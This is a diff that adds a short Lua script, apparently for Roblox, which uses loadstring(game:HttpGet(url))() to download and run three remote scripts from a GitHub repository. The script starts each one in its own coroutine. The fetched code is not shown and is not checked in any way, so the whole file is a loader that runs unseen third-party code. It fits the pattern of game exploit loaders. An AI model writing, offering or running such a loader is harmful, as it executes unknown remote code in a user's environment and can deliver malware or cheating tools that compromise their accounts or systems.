@@ -1,0 +1,11 @@
+local function runScript(url)
+    loadstring(game:HttpGet(url))()
+end
+
+local co1 = coroutine.create(runScript)
+local co2 = coroutine.create(runScript)
+local co3 = coroutine.create(runScript)
+
+coroutine.resume(co1, "https://raw.githubusercontent.com/hzhzhzsjjs/Zhzh/refs/heads/main/%3F")
+coroutine.resume(co2, "https://raw.githubusercontent.com/hzhzhzsjjs/Zhzh/refs/heads/main/Noti")
+coroutine.resume(co3, "https://raw.githubusercontent.com/hzhzhzsjjs/Zhzh/refs/heads/main/Vfx")
